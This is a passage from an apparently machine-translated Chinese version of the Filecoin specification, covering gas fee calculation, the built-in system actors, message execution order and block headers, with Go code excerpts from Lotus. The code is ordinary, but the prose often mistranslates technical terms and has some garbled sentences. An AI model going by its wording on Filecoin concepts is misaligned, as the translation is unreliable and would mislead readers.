GasPremium有效地使它的矿工attoFIL GasPremium = GasFeeCap - BaseFee。请注意，与相对于GasPremium应用于GasLimit，GasUsed以使矿工的消息选择更加直接。\n\n示例：ComputeGasOverestimationBurn\nComputeGasOverestimationBurn计算要退款的燃气量和要燃烧的燃气量结果是（退款，燃烧）\nfunc ComputeGasOverestimationBurn(gasUsed, gasLimit int64) (int64, int64) {\n\tif gasUsed == 0 {\n\t\treturn 0, gasLimit\n\t}\n \n\t// over = gasLimit/gasUsed - 1 - 0.1\n\t// over = min(over, 1)\n\t// gasToBurn = (gasLimit - gasUsed) * over\n \n\t// so to factor out division from `over`\n\t// over*gasUsed = min(gasLimit - (11*gasUsed)/10, gasUsed)\n\t// gasToBurn = ((gasLimit - gasUsed)*over*gasUsed) / gasUsed\n\tover := gasLimit - (gasOveruseNum*gasUsed)/gasOveruseDenom\n\tif over &lt; 0 {\n\t\treturn gasLimit - gasUsed, 0\n\t}\n \n\t// if we want sharper scaling it goes here:\n\t// over *= 2\n \n\tif over &gt; gasUsed {\n\t\tover = gasUsed\n\t}\n \n\t// needs bigint, as it overflows in pathological case gasLimit &gt; 2^32 gasUsed = gasLimit / 2\n\tgasToBurn := big.NewInt(gasLimit - gasUsed)\n\tgasToBurn = big.Mul(gasToBurn, big.NewInt(over))\n\tgasToBurn = big.Div(gasToBurn, big.NewInt(gasUsed))\n \n\treturn gasLimit - gasUsed - gasToBurn.Int64(), gasToBurn.Int64()\n}\n示例：ComputeNextBaseFee\nfunc ComputeNextBaseFee(baseFee types.BigInt, gasLimitUsed int64, noOfBlocks int, epoch abi.ChainEpoch) types.BigInt {\n\t// deta := gasLimitUsed/noOfBlocks - build.BlockGasTarget\n\t// change := baseFee * deta / BlockGasTarget\n\t// nextBaseFee = baseFee + change\n\t// nextBaseFee = max(nextBaseFee, build.MinimumBaseFee)\n \n\tvar delta int64\n\tif epoch &gt; build.UpgradeSmokeHeight {\n\t\tdelta = gasLimitUsed / int64(noOfBlocks)\n\t\tdelta -= build.BlockGasTarget\n\t} else {\n\t\tdelta = build.PackingEfficiencyDenom * gasLimitUsed / (int64(noOfBlocks) * build.PackingEfficiencyNum)\n\t\tdelta -= build.BlockGasTarget\n\t}\n \n\t// cap change at 12.5% (BaseFeeMaxChangeDenom) by capping delta\n\tif delta &gt; build.BlockGasTarget {\n\t\tdelta = build.BlockGasTarget\n\t}\n\tif delta &lt; -build.BlockGasTarget {\n\t\tdelta = -build.BlockGasTarget\n\t}\n \n\tchange := big.Mul(baseFee, big.NewInt(delta))\n\tchange = big.Div(change, big.NewInt(build.BlockGasTarget))\n\tchange = big.Div(change, big.NewInt(build.BaseFeeMaxChangeDenom))\n \n\tnextBaseFee := big.Add(baseFee, change)\n\tif big.Cmp(nextBaseFee, big.NewInt(build.MinimumBaseFee)) &lt; 0 {\n\t\tnextBaseFee = big.NewInt(build.MinimumBaseFee)\n\t}\n\treturn nextBaseFee\n}\n2.3.5.3注释与含义\n\n的值GasFeeCap应始终高于网络的BaseFee。如果消息的GasFeeCap低于BaseFee，则其余部分来自矿工（作为罚款）。由于矿工选择的消息的价格低于BaseFee网络费用（即，不包括网络费用），因此对矿工施加此罚款。然而，矿工可能要选择一个消息，其GasFeeCap比小BaseFee，如果同一个发件人在邮件池，其另一条消息GasFeeCap比要大得多BaseFee。回想一下，如果存在多个矿工，则矿工应该从消息池中选择发件人的所有消息。理由是增加第二条消息的费用将弥补第一条消息的损失。\n如果BaseFee + GasPremium&gt; GasFeeCap，则矿工可能不会获得全部GasLimit * GasPremium作为奖励。\n一条消息的花费不得超过GasFeeCap * GasLimit。从该金额中，网络首先BaseFee被支付（烧掉）。之后，最多GasLimit * GasPremium将给予矿工作为奖励。\n耗尽气体的消息失败，并显示“耗尽气体”退出代码。GasUsed * BaseFee仍将被烧毁（在这种情况下GasUsed = GasLimit），而矿工仍将得到奖励GasLimit * GasPremium。这是假定GasFeeCap &gt; BaseFee + GasPremium。\n较低的价格GasFeeCap可能会导致消息滞留在消息池中，因为对于任何矿工来说，选择它并将其包含在一个块中，在利润方面都不够吸引人。发生这种情况时，将有一个更新程序，以GasFeeCap使消息对矿工更具吸引力。发送者可以将新消息推送到消息池（默认情况下，该消息池将传播到其他矿工的消息池），其中：i）旧消息和新消息的标识符相同（例如，相同Nonce），并且ii）GasPremium更新并增加至少25％的先前值。\n\n2.3.6系统角色\n总共有十一（11）个内置的System Actor，但是并不是所有的Actor都与VM交互。每个演员都由代码ID（或CID）标识。\nVM处理需要两个系统参与者：\n\n在 InitActor，初始化新的参与者和记录网络名称，\n在 CronActor，，在每个时间段运行关键功能的调度演员。还有两个与VM交互的参与者：\n负责用户帐户（非单一帐户）的 AccountActor，以及\n该 RewardActor块奖励和令牌归属（单）。\n\n不直接与VM交互的其余七（7）个内置系统角色是：\n\nStorageMarketActor：负责管理存储和检索交易[ Market Actor Repo ]\nStorageMinerActor：负责处理采矿业务并收集证据的演员[ Storage Miner Actor Repo ]\nMultisigActor（或Multi-Signature Wallet Actor）：负责处理涉及Filecoin钱包的操作[ Multisig Actor Repo ]\nPaymentChannelActor：负责建立和结算与支付渠道有关的资金[ Paych Actor Repo ]\nStoragePowerActor：负责跟踪每个存储矿工分配的存储功率[ Storage Power Actor ]\nVerifiedRegistryActor：负责管理已验证的客户[ Verifreg Actor Repo ]\nSystemActor：普通系统演员[ System Actor Repo ]\n\n2.3.6.1 CronActor\n内置在创世状态中，CronActor的分派表调用StoragePowerActor和StorageMarketActor，以维护内部状态并处理延迟的事件。在网络升级后，它原则上可以调用其他参与者。\n例：\npackage cron\n \nimport (\n\t&quot;github.com/filecoin-project/go-state-types/abi&quot;\n\t&quot;github.com/filecoin-project/go-state-types/cbor&quot;\n\tcron0 &quot;github.com/filecoin-project/specs-actors/actors/builtin/cron&quot;\n\t&quot;github.com/ipfs/go-cid&quot;\n \n\t&quot;github.com/filecoin-project/specs-actors/v2/actors/builtin&quot;\n\t&quot;github.com/filecoin-project/specs-actors/v2/actors/runtime&quot;\n)\n \n// The cron actor is a built-in singleton that sends messages to other registered actors at the end of each epoch.\ntype Actor struct{}\n \nfunc (a Actor) Exports() []interface{} {\n\treturn []interface{}{\n\t\tbuiltin.MethodConstructor: a.Constructor,\n\t\t2:                         a.EpochTick,\n\t}\n}\n \nfunc (a Actor) Code() cid.Cid {\n\treturn builtin.CronActorCodeID\n}\n \nfunc (a Actor) IsSingleton() bool {\n\treturn true\n}\n \nfunc (a Actor) State() cbor.Er {\n\treturn new(State)\n}\n \nvar _ runtime.VMActor = Actor{}\n \n//type ConstructorParams struct {\n//\tEntries []Entry\n//}\ntype ConstructorParams = cron0.ConstructorParams\n \ntype EntryParam = cron0.Entry\n \nfunc (a Actor) Constructor(rt runtime.Runtime, params *ConstructorParams) *abi.EmptyValue {\n\trt.ValidateImmediateCallerIs(builtin.SystemActorAddr)\n\tentries := make([]Entry, len(params.Entries))\n\tfor i, e := range params.Entries {\n\t\tentries[i] = Entry(e) // Identical\n\t}\n\trt.StateCreate(ConstructState(entries))\n\treturn nil\n}\n \n// Invoked by the system after all other messages in the epoch have been processed.\nfunc (a Actor) EpochTick(rt runtime.Runtime, _ *abi.EmptyValue) *abi.EmptyValue {\n\trt.ValidateImmediateCallerIs(builtin.SystemActorAddr)\n \n\tvar st State\n\trt.StateReadonly(&amp;st)\n\tfor _, entry := range st.Entries {\n\t\t_ = rt.Send(entry.Receiver, entry.MethodNum, nil, abi.NewTokenAmount(0), &amp;builtin.Discard{})\n\t\t// Any error and return value are ignored.\n\t}\n \n\treturn nil\n}\n2.3.6.2初始化演员\n将InitActor有可能创造新的角色，例如，那些进入系统的电源。它维护着一个表，用于将公共密钥和临时参与者地址解析为其规范的ID地址。无效的CID不应提交给状态树。\n请注意，在进行链重组时，规范ID地址不会保留。演员地址或公钥在链重组后仍然有效。\n例：\npackage init\n \nimport (\n\taddr &quot;github.com/filecoin-project/go-address&quot;\n\t&quot;github.com/filecoin-project/go-state-types/abi&quot;\n\t&quot;github.com/filecoin-project/go-state-types/cbor&quot;\n\t&quot;github.com/filecoin-project/go-state-types/exitcode&quot;\n\tinit0 &quot;github.com/filecoin-project/specs-actors/actors/builtin/init&quot;\n\tcid &quot;github.com/ipfs/go-cid&quot;\n \n\t&quot;github.com/filecoin-project/specs-actors/v2/actors/builtin&quot;\n\t&quot;github.com/filecoin-project/specs-actors/v2/actors/runtime&quot;\n\tautil &quot;github.com/filecoin-project/specs-actors/v2/actors/util&quot;\n\t&quot;github.com/filecoin-project/specs-actors/v2/actors/util/adt&quot;\n)\n \n// The init actor uniquely has the power to create new actors.\n// It maintains a table resolving pubkey and temporary actor addresses to the canonical ID-addresses.\ntype Actor struct{}\n \nfunc (a Actor) Exports() []interface{} {\n\treturn []interface{}{\n\t\tbuiltin.MethodConstructor: a.Constructor,\n\t\t2:                         a.Exec,\n\t}\n}\n \nfunc (a Actor) Code() cid.Cid {\n\treturn builtin.InitActorCodeID\n}\n \nfunc (a Actor) IsSingleton() bool {\n\treturn true\n}\n \nfunc (a Actor) State() cbor.Er { return new(State) }\n \nvar _ runtime.VMActor = Actor{}\n \n//type ConstructorParams struct {\n//\tNetworkName string\n//}\ntype ConstructorParams = init0.ConstructorParams\n \nfunc (a Actor) Constructor(rt runtime.Runtime, params *ConstructorParams) *abi.EmptyValue {\n\trt.ValidateImmediateCallerIs(builtin.SystemActorAddr)\n\temptyMap, err := adt.MakeEmptyMap(adt.AsStore(rt)).Root()\n\tbuiltin.RequireNoErr(rt, err, exitcode.ErrIllegalState, &quot;failed to construct state&quot;)\n \n\tst := ConstructState(emptyMap, params.NetworkName)\n\trt.StateCreate(st)\n\treturn nil\n}\n \n//type ExecParams struct {\n//\tCodeCID           cid.Cid `checked:&quot;true&quot;` // invalid CIDs won&#039;t get committed to the state tree\n//\tConstructorParams []byte\n//}\ntype ExecParams = init0.ExecParams\n \n//type ExecReturn struct {\n//\tIDAddress     addr.Address // The canonical ID-based address for the actor.\n//\tRobustAddress addr.Address // A more expensive but re-org-safe address for the newly created actor.\n//}\ntype ExecReturn = init0.ExecReturn\n \nfunc (a Actor) Exec(rt runtime.Runtime, params *ExecParams) *ExecReturn {\n\trt.ValidateImmediateCallerAcceptAny()\n\tcallerCodeCID, ok := rt.GetActorCodeCID(rt.Caller())\n\tautil.AssertMsg(ok, &quot;no code for actor at %s&quot;, rt.Caller())\n\tif !canExec(callerCodeCID, params.CodeCID) {\n\t\trt.Abortf(exitcode.ErrForbidden, &quot;caller type %v cannot exec actor type %v&quot;, callerCodeCID, params.CodeCID)\n\t}\n \n\t// Compute a re-org-stable address.\n\t// This address exists for use by messages coming from outside the system, in order to\n\t// stably address the newly created actor even if a chain re-org causes it to end up with\n\t// a different ID.\n\tuniqueAddress := rt.NewActorAddress()\n \n\t// Allocate an ID for this actor.\n\t// Store mapping of pubkey or actor address to actor ID\n\tvar st State\n\tvar idAddr addr.Address\n\trt.StateTransaction(&amp;st, func() {\n\t\tvar err error\n\t\tidAddr, err = st.MapAddressToNewID(adt.AsStore(rt), uniqueAddress)\n\t\tbuiltin.RequireNoErr(rt, err, exitcode.ErrIllegalState, &quot;failed to allocate ID address&quot;)\n\t})\n \n\t// Create an empty actor.\n\trt.CreateActor(params.CodeCID, idAddr)\n \n\t// Invoke constructor.\n\tcode := rt.Send(idAddr, builtin.MethodConstructor, builtin.CBORBytes(params.ConstructorParams), rt.ValueReceived(), &amp;builtin.Discard{})\n\tbuiltin.RequireSuccess(rt, code, &quot;constructor failed&quot;)\n \n\treturn &amp;ExecReturn{IDAddress: idAddr, RobustAddress: uniqueAddress}\n}\n \nfunc canExec(callerCodeID cid.Cid, execCodeID cid.Cid) bool {\n\tswitch execCodeID {\n\tcase builtin.StorageMinerActorCodeID:\n\t\tif callerCodeID == builtin.StoragePowerActorCodeID {\n\t\t\treturn true\n\t\t}\n\t\treturn false\n\tcase builtin.PaymentChannelActorCodeID, builtin.MultisigActorCodeID:\n\t\treturn true\n\tdefault:\n\t\treturn false\n\t}\n}\n2.3.6.3奖励演员\n的RewardActor就是unminted Filecoin令牌将被保留。演员直接将奖励分配给矿工演员，他们被锁定以归属。当前纪元的奖励值在纪元末通过cron tick更新。\n例：\npackage reward\n \nimport (\n\t&quot;github.com/filecoin-project/go-state-types/abi&quot;\n\t&quot;github.com/filecoin-project/go-state-types/big&quot;\n\t&quot;github.com/filecoin-project/go-state-types/cbor&quot;\n\t&quot;github.com/filecoin-project/go-state-types/exitcode&quot;\n\trtt &quot;github.com/filecoin-project/go-state-types/rt&quot;\n\treward0 &quot;github.com/filecoin-project/specs-actors/actors/builtin/reward&quot;\n\t&quot;github.com/ipfs/go-cid&quot;\n \n\t&quot;github.com/filecoin-project/specs-actors/v2/actors/builtin&quot;\n\t&quot;github.com/filecoin-project/specs-actors/v2/actors/runtime&quot;\n\t. &quot;github.com/filecoin-project/specs-actors/v2/actors/util&quot;\n\t&quot;github.com/filecoin-project/specs-actors/v2/actors/util/smoothing&quot;\n)\n \n// PenaltyMultiplier is the factor miner penaltys are scaled up by\nconst PenaltyMultiplier = 3\n \ntype Actor struct{}\n \nfunc (a Actor) Exports() []interface{} {\n\treturn []interface{}{\n\t\tbuiltin.MethodConstructor: a.Constructor,\n\t\t2:                         a.AwardBlockReward,\n\t\t3:                         a.ThisEpochReward,\n\t\t4:                         a.UpdateNetworkKPI,\n\t}\n}\n \nfunc (a Actor) Code() cid.Cid {\n\treturn builtin.RewardActorCodeID\n}\n \nfunc (a Actor) IsSingleton() bool {\n\treturn true\n}\n \nfunc (a Actor) State() cbor.Er {\n\treturn new(State)\n}\n \nvar _ runtime.VMActor = Actor{}\n \nfunc (a Actor) Constructor(rt runtime.Runtime, currRealizedPower *abi.StoragePower) *abi.EmptyValue {\n\trt.ValidateImmediateCallerIs(builtin.SystemActorAddr)\n \n\tif currRealizedPower == nil {\n\t\trt.Abortf(exitcode.ErrIllegalArgument, &quot;argument should not be nil&quot;)\n\t\treturn nil // linter does not understand abort exiting\n\t}\n\tst := ConstructState(*currRealizedPower)\n\trt.StateCreate(st)\n\treturn nil\n}\n \n//type AwardBlockRewardParams struct {\n//\tMiner     address.Address\n//\tPenalty   abi.TokenAmount // penalty for including bad messages in a block, &gt;= 0\n//\tGasReward abi.TokenAmount // gas reward from all gas fees in a block, &gt;= 0\n//\tWinCount  int64           // number of reward units won, &gt; 0\n//}\ntype AwardBlockRewardParams = reward0.AwardBlockRewardParams\n \n// Awards a reward to a block producer.\n// This method is called only by the system actor, implicitly, as the last message in the evaluation of a block.\n// The system actor thus computes the parameters and attached value.\n//\n// The reward includes two components:\n// - the epoch block reward, computed and paid from the reward actor&#039;s balance,\n// - the block gas reward, expected to be transferred to the reward actor with this invocation.\n//\n// The reward is reduced before the residual is credited to the block producer, by:\n// - a penalty amount, provided as a parameter, which is burnt,\nfunc (a Actor) AwardBlockReward(rt runtime.Runtime, params *AwardBlockRewardParams) *abi.EmptyValue {\n\trt.ValidateImmediateCallerIs(builtin.SystemActorAddr)\n\tpriorBalance := rt.CurrentBalance()\n\tif params.Penalty.LessThan(big.Zero()) {\n\t\trt.Abortf(exitcode.ErrIllegalArgument, &quot;negative penalty %v&quot;, params.Penalty)\n\t}\n\tif params.GasReward.LessThan(big.Zero()) {\n\t\trt.Abortf(exitcode.ErrIllegalArgument, &quot;negative gas reward %v&quot;, params.GasReward)\n\t}\n\tif priorBalance.LessThan(params.GasReward) {\n\t\trt.Abortf(exitcode.ErrIllegalState, &quot;actor current balance %v insufficient to pay gas reward %v&quot;,\n\t\t\tpriorBalance, params.GasReward)\n\t}\n\tif params.WinCount &lt;= 0 {\n\t\trt.Abortf(exitcode.ErrIllegalArgument, &quot;invalid win count %d&quot;, params.WinCount)\n\t}\n \n\tminerAddr, ok := rt.ResolveAddress(params.Miner)\n\tif !ok {\n\t\trt.Abortf(exitcode.ErrNotFound, &quot;failed to resolve given owner address&quot;)\n\t}\n\t// The miner penalty is scaled up by a factor of PenaltyMultiplier\n\tpenalty := big.Mul(big.NewInt(PenaltyMultiplier), params.Penalty)\n\ttotalReward := big.Zero()\n\tvar st State\n\trt.StateTransaction(&amp;st, func() {\n\t\tblockReward := big.Mul(st.ThisEpochReward, big.NewInt(params.WinCount))\n\t\tblockReward = big.Div(blockReward, big.NewInt(builtin.ExpectedLeadersPerEpoch))\n\t\ttotalReward = big.Add(blockReward, params.GasReward)\n\t\tcurrBalance := rt.CurrentBalance()\n\t\tif totalReward.GreaterThan(currBalance) {\n\t\t\trt.Log(rtt.WARN, &quot;reward actor balance %d below totalReward expected %d, paying out rest of balance&quot;, currBalance, totalReward)\n\t\t\ttotalReward = currBalance\n \n\t\t\tblockReward = big.Sub(totalReward, params.GasReward)\n\t\t\t// Since we have already asserted the balance is greater than gas reward blockReward is &gt;= 0\n\t\t\tAssertMsg(blockReward.GreaterThanEqual(big.Zero()), &quot;programming error, block reward is %v below zero&quot;, blockReward)\n\t\t}\n\t\tst.TotalStoragePowerReward = big.Add(st.TotalStoragePowerReward, blockReward)\n\t})\n \n\tAssertMsg(totalReward.LessThanEqual(priorBalance), &quot;reward %v exceeds balance %v&quot;, totalReward, priorBalance)\n \n\t// if this fails, we can assume the miner is responsible and avoid failing here.\n\trewardParams := builtin.ApplyRewardParams{\n\t\tReward:  totalReward,\n\t\tPenalty: penalty,\n\t}\n\tcode := rt.Send(minerAddr, builtin.MethodsMiner.ApplyRewards, &amp;rewardParams, totalReward, &amp;builtin.Discard{})\n\tif !code.IsSuccess() {\n\t\trt.Log(rtt.ERROR, &quot;failed to send ApplyRewards call to the miner actor with funds: %v, code: %v&quot;, totalReward, code)\n\t\tcode := rt.Send(builtin.BurntFundsActorAddr, builtin.MethodSend, nil, totalReward, &amp;builtin.Discard{})\n\t\tif !code.IsSuccess() {\n\t\t\trt.Log(rtt.ERROR, &quot;failed to send unsent reward to the burnt funds actor, code: %v&quot;, code)\n\t\t}\n\t}\n \n\treturn nil\n}\n \n// Changed since v0:\n// - removed ThisEpochReward (unsmoothed)\ntype ThisEpochRewardReturn struct {\n\tThisEpochRewardSmoothed smoothing.FilterEstimate\n\tThisEpochBaselinePower  abi.StoragePower\n}\n \n// The award value used for the current epoch, updated at the end of an epoch\n// through cron tick.  In the case previous epochs were null blocks this\n// is the reward value as calculated at the last non-null epoch.\nfunc (a Actor) ThisEpochReward(rt runtime.Runtime, _ *abi.EmptyValue) *ThisEpochRewardReturn {\n\trt.ValidateImmediateCallerAcceptAny()\n \n\tvar st State\n\trt.StateReadonly(&amp;st)\n\treturn &amp;ThisEpochRewardReturn{\n\t\tThisEpochRewardSmoothed: st.ThisEpochRewardSmoothed,\n\t\tThisEpochBaselinePower:  st.ThisEpochBaselinePower,\n\t}\n}\n \n// Called at the end of each epoch by the power actor (in turn by its cron hook).\n// This is only invoked for non-empty tipsets, but catches up any number of null\n// epochs to compute the next epoch reward.\nfunc (a Actor) UpdateNetworkKPI(rt runtime.Runtime, currRealizedPower *abi.StoragePower) *abi.EmptyValue {\n\trt.ValidateImmediateCallerIs(builtin.StoragePowerActorAddr)\n\tif currRealizedPower == nil {\n\t\trt.Abortf(exitcode.ErrIllegalArgument, &quot;arugment should not be nil&quot;)\n\t}\n \n\tvar st State\n\trt.StateTransaction(&amp;st, func() {\n\t\tprev := st.Epoch\n\t\t// if there were null runs catch up the computation until\n\t\t// st.Epoch == rt.CurrEpoch()\n\t\tfor st.Epoch &lt; rt.CurrEpoch() {\n\t\t\t// Update to next epoch to process null rounds\n\t\t\tst.updateToNextEpoch(*currRealizedPower)\n\t\t}\n \n\t\tst.updateToNextEpochWithReward(*currRealizedPower)\n\t\t// only update smoothed estimates after updating reward and epoch\n\t\tst.updateSmoothedEstimates(st.Epoch - prev)\n\t})\n\treturn nil\n}\n2.3.6.4AccountActor\n该AccountActor负责用户帐户。帐户参与者不是由创建的InitActor，但系统会调用其构造函数。通过向公共密钥样式的地址发送消息来创建帐户参与者。地址必须为BLS或SECP，否则应该存在退出错误。帐户参与者正在使用新的参与者地址更新状态树。\n例：\npackage account\n \nimport (\n\taddr &quot;github.com/filecoin-project/go-address&quot;\n\t&quot;github.com/filecoin-project/go-state-types/abi&quot;\n\t&quot;github.com/filecoin-project/go-state-types/cbor&quot;\n\t&quot;github.com/filecoin-project/go-state-types/exitcode&quot;\n\t&quot;github.com/ipfs/go-cid&quot;\n \n\t&quot;github.com/filecoin-project/specs-actors/v2/actors/builtin&quot;\n\t&quot;github.com/filecoin-project/specs-actors/v2/actors/runtime&quot;\n)\n \ntype Actor struct{}\n \nfunc (a Actor) Exports() []interface{} {\n\treturn []interface{}{\n\t\t1: a.Constructor,\n\t\t2: a.PubkeyAddress,\n\t}\n}\n \nfunc (a Actor) Code() cid.Cid {\n\treturn builtin.AccountActorCodeID\n}\n \nfunc (a Actor) State() cbor.Er {\n\treturn new(State)\n}\n \nvar _ runtime.VMActor = Actor{}\n \ntype State struct {\n\tAddress addr.Address\n}\n \nfunc (a Actor) Constructor(rt runtime.Runtime, address *addr.Address) *abi.EmptyValue {\n\t// Account actors are created implicitly by sending a message to a pubkey-style address.\n\t// This constructor is not invoked by the InitActor, but by the system.\n\trt.ValidateImmediateCallerIs(builtin.SystemActorAddr)\n\tswitch address.Protocol() {\n\tcase addr.SECP256K1:\n\tcase addr.BLS:\n\t\tbreak // ok\n\tdefault:\n\t\trt.Abortf(exitcode.ErrIllegalArgument, &quot;address must use BLS or SECP protocol, got %v&quot;, address.Protocol())\n\t}\n\tst := State{Address: *address}\n\trt.StateCreate(&amp;st)\n\treturn nil\n}\n \n// Fetches the pubkey-type address from this actor.\nfunc (a Actor) PubkeyAddress(rt runtime.Runtime, _ *abi.EmptyValue) *addr.Address {\n\trt.ValidateImmediateCallerAcceptAny()\n\tvar st State\n\trt.StateReadonly(&amp;st)\n\treturn &amp;st.Address\n}\n2.3.7VM解释器-消息调用（外部VM）\nVM解释器根据提示集在其父状态上的提示集协调消息的执行，从而产生新状态和一系列消息回执。此新状态的CID和收据集合的CID包含在后续纪元的块中，这些纪元必须同意这些CID才能形成新的提示集。\n每个状态更改都由消息的执行来驱动。提示集中所有块中的消息必须执行才能产生下一个状态。来自第一个块的所有消息均在技巧集中的第二个和后续块的消息之前执行。对于每个块，首先执行BLS聚合的消息，然后执行SECP签名的消息。\n2.3.7.1隐式消息\n除了显式包含在每个块中的消息之外，隐含消息还会在每个时期对状态进行一些更改。隐式消息不在节点之间传输，而是由解释器在评估时构造的。\n对于提示集中的每个块，隐式消息：\n\n调用区块生产者的矿工演员来处理（已验证的）选举PoSt提交，作为区块中的第一条消息；\n调用奖励参与者将区块奖励支付给矿工的所有者帐户，作为区块中的最终消息；\n\n对于每个提示集，一个隐式消息：\n\n调用cron actor来处理自动支票和付款，作为提示集中的最后一条消息。\n\n所有隐式消息的构造From地址都是杰出的系统帐户参与者。他们将汽油价格指定为零，但必须包含在计算中。为了计算新状态，它们必须成功（退出代码为零）。隐式邮件的收据不包括在收据列表中；只有明确的消息才有明确的回执。\n2.3.7.2煤气费\n在大多数情况下，消息的发送者向产生包含该消息的块的矿工支付执行该消息所需的汽油费。\n执行该消息后，每次执行该消息所产生的汽油费将立即支付给矿工所有者帐户。所获得的集体奖励或汽油费没有任何负担：两者都可以立即花费。\n2.3.7.3邮件重复\n由于不同的矿工在同一时期产生区块，因此单个提示集中的多个区块可能包含相同的消息（由相同的CID标识）。发生这种情况时，仅在第一次按提示集的规范顺序遇到该消息时才对其进行处理。消息的后续实例将被忽略，不会导致任何状态突变，产生收据或向区块生产者支付费用。\n因此，总结了提示集的执行顺序：\n\n为第一块支付奖励\n处理第一块的选举职位\n第一个块的消息（SECP之前的BLS）\n支付第二块奖励\n处理第二个区块的选举职位\n第二个块的消息（SECP之前的BLS，跳过任何已经遇到的消息）\n[... subsequent blocks ...]\n定时刻度\n\n2.3.7.4消息有效性和失败\n有效块中的每个消息都可以被处理并产生收据（请注意，块有效性表示所有消息在语法上均有效–请参阅 消息语法–并正确签名）。但是，执行成功与否取决于消息所应用的状态。如果消息执行失败，则相应的收据将携带非零的退出代码。\n如果消息由于可以合理地归因于矿工的原因而失败，包括在父状态中永远不可能成功的消息，或者由于发件人缺乏资金来支付最大消息成本，则矿工将通过烧钱来支付罚款煤气费（而不是发送方向大宗矿工支付的费用）。\n消息失败导致的唯一状态更改是：\n\n发送方的增量CallSeqNum，并从发送方向包含消息的区块矿主支付汽油费；要么\n罚款等于失败消息的汽油费，由矿工烧掉（发件人未CallSeqNum更改）。\n\n如果处于紧接的先前状态，则消息执行将失败：\n\n该From演员不存在于该州（受到矿工处罚），\n该From演员是不是帐号演员（的矿工处罚），\n该CallSeqNum消息不匹配CallSeqNum的的From演员（的矿工处罚），\n的From演员不具有足够的平衡，以覆盖消息的总和Value加上最大气体成本，GasLimit * GasPrice（矿工处罚），\n该参与者不在To状态中，并且该To地址不是pubkey样式的地址，\n该Toactor存在（或作为帐户隐式创建），但是没有对应于非零的方法MethodNum，\n反序列化Params不是长度匹配数组Toactor的MethodNum方法的数组，\n反序列化Params对于Toactor的MethodNum方法指定的类型无效，\n被调用的方法消耗的气体多于GasLimit允许的量，\n调用的方法以非零代码（通过Runtime.Abort()）退出，或者\n由于上述任何原因，接收方发送的任何内部消息都会失败。\n\n请注意，如果To参与者不在状态中并且该地址是有效H(pubkey)地址，则它将被创建为帐户参与者。\n2.4区块链\nFilecoin区块链是一种分布式虚拟机，可以达成共识，处理消息，进行存储帐户并维护Filecoin协议中的安全性。它是链接Filecoin系统中各种参与者的主要界面。\nFilecoin区块链系统包括：\n\n一个 消息池子系统节点使用跟踪和消息传播矿工已经宣布他们要在blockchain包括。\n用于解释和执行消息以更新系统状态的 虚拟机子系统。\n一 国树，其管理的创建和状态的树木（系统状态）从给定的子链确定性VM产生的维护子系统。\n甲 链同步（ChainSync） susbystem验证消息块该轨道和传播，保持套候选链在其上可以矿工和矿上的传入块运行语法验证。\n一个 存储功率共识子系统，该子系统跟踪给定链的存储状态（即 Storage Subystem），并帮助区块链系统选择要扩展的子链并将其包括在子链中。\n\n区块链系统还包括：\n\n一个 链经理，它保持给定链的状态，提供设施等blockchain子系统将在顺序查询有关最新的链路状态来运行，并确保进入块纳入链之前在语义验证。\n阿 块生产者被称为在一个成功的领导人选举的事件，以产生一个新的块，将其转发到所述同步装置为传播之前扩展当前最重链。\n\n从高层次来看，Filecoin区块链通过连续几轮的领导人选举而增长，在选举中，许多矿工被选举产生一个区块，将其纳入链中将为他们赢得区块奖励。Filecoin的区块链依靠存储能力运行。也就是说，矿工通过其共识算法来确定要开采的子链取决于该子链的存储量。在高层，“ 存储功率共识”子系统维护一个功率表，该表跟踪存储矿工参与者通过部门承诺和时空证明为网络贡献的存储量 。\n2.4.1积木\n区块是Filecoin区块链的主要单元，大多数其他区块链也是如此。阻止消息与提示集直接链接，提示集是阻止消息的组，本节稍后将对此进行详细介绍。在下文中，我们讨论Block消息的主要结构以及Filecoin区块链中验证Block消息的过程。\n2.4.1.1块\n区块是Filecoin区块链的主要单元。\nFilecoin区块链中的Block结构包括：i）Block Header，ii）Block内的消息列表，以及iii）Signed消息。这在FullBlock抽象内部表示。该消息指示要应用的必需的一组更改，以达到链的确定性状态。\n该块的Lotus实现具有以下内容struct：\n示例：FullBlock\ntype FullBlock struct {\n\tHeader        *BlockHeader\n\tBlsMessages   []*Message\n\tSecpkMessages []*SignedMessage\n}\n\n注意\n块在功能上与Filecoin协议中的块头相同。虽然块标题包含指向完整系统状态，消息和消息回执的Merkle链接，但可以将块视为该信息的完整集合（不仅是Merkle根，还包括状态树的完整数据，消息树，收据树等）。由于完整块的大小很大，因此Filecoin区块链由块头而不是完整块组成。我们经常使用这些术语，block并且block header可以互换使用。\n\nABlockHeader是块的规范表示。BlockHeader在矿工节点之间传播。从blockcheader消息中，矿工拥有所有必需的信息，以应用关联FullBlock的状态并更新链。为了做到这一点，BlockHeader下面显示了需要包含的最少信息项集，其中包括：矿工的地址，票证， 时空证明，此块所在的父母的CID从IPLD DAG以及消息自身的CID演变而来。\n块标头的Lotus实现具有以下struct：\n示例：BlockHeader\ntype BlockHeader struct {\n\tMiner address.Address // 0\n \n\tTicket *Ticket // 1\n \n\tElectionProof *ElectionProof // 2\n \n\tBeaconEntries []BeaconEntry // 3\n \n\tWinPoStProof []proof2.PoStProof // 4\n \n\tParents []cid.Cid // 5\n \n\tParentWeight BigInt // 6\n \n\tHeight abi.ChainEpoch // 7\n \n\tParentStateRoot cid.Cid // 8\n \n\tParentMessageReceipts cid.Cid // 8\n \n\tMessages cid.Cid // 10\n \n\tBLSAggregate *crypto.Signature // 11\n \n\tTimestamp uint64 // 12\n \n\tBlockSig *crypto.Signature // 13\n \n\tForkSignaling uint64 // 14\n \n\t// ParentBaseFee is the base fee after executing parent tipset\n\tParentBaseFee abi.TokenAmount // 15\n \n\t// internal\n\tvalidated bool // true if the signature has been validated\n}\n示例：票证\ntype Ticket struct {\n\tVRFProof []byte\n}\n示例：ElectionProof\ntype ElectionProof struct {\n\tWinCount int64\n\tVRFProof []byte\n}\n示例：BeaconEntry\ntype BeaconEntry struct {\n\tRound uint64\n\tData  []byte\n}\n该BlockHeader结构必须引用当前回合的TicketWinner，以确保将正确的获胜者传递给 ChainSync。\nfunc IsTicketWinner(vrfTicket []byte, mypow BigInt, totpow BigInt) bool\n该Message结构必须包括源（From）和目标（To）地址，aNonce和GasPrice。\n消息的Lotus实现具有以下结构：\n示例：消息\ntype Message struct {\n\tVersion uint64\n \n\tTo   address.Address\n\tFrom address.Address\n \n\tNonce uint64\n \n\tValue abi.TokenAmount\n \n\tGasLimit   int64\n\tGasFeeCap  abi.TokenAmount\n\tGasPremium 